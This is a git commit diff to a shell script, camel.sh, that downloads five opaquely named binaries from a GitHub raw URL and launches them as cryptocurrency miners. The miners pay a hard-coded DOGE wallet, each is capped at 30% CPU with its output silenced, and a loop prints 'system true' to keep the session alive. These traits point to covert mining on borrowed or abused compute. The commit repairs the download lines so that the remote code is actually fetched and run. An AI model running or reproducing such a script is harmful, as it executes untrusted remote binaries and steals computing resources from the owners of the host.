854978e2f94f12bb6059ff708e61a41c8e195c15
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2021-12-31 23:28:46 +0700

    Update camel.sh

--- camel.sh
+++ camel.sh
@@ -2,11 +2,11 @@
 apt-get update -y
 apt-get install -y cpulimit screen
 apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4
-https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
-https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
-https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
-https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
-https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px1
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px2
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px3
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px4
+wget https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/px5
 chmod +x px1
 chmod +x px2
 chmod +x px3
@@ -21,4 +21,4 @@ cpulimit -l 30 ./px2 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$wo
 cpulimit -l 30 ./px3 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./px4 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
 cpulimit -l 30 ./px5 -a verus -o $pool -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.$workername -p c=DOGE,mc=VRSC -x -t $thread $prox >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+while :; do echo "system true"; sleep 3m; done
